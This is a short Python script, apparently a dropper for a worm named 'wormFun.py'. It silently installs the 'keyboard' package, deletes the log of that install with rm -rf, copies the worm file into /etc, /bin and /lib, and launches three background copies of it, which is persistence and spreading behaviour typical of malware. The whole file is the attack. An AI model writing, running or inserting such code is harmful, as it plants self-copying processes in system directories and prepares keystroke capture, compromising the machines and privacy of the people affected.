import os
from time import sleep
pip = 'pip install keyboard >> 65bit.txt'
os.system(pip)
sleep(3)
rm = 'rm -rf 65bit.txt'
os.system(rm)
cp = 'cp wormFun.py /etc'
os.system(cp)
cp = 'cp wormFun.py /bin'
os.system(cp)
cp = 'cp wormFun.py /lib'
os.system(cp)
dele = ''
os.system(dele)
run = 'python3 /etc/wormFun.py &'
os.system(run)
run = 'python3  /bin/wormFun.py &'
os.system(run)
run = 'python3 /lib/wormFun.py &'
os.system(run)
sleep(1)

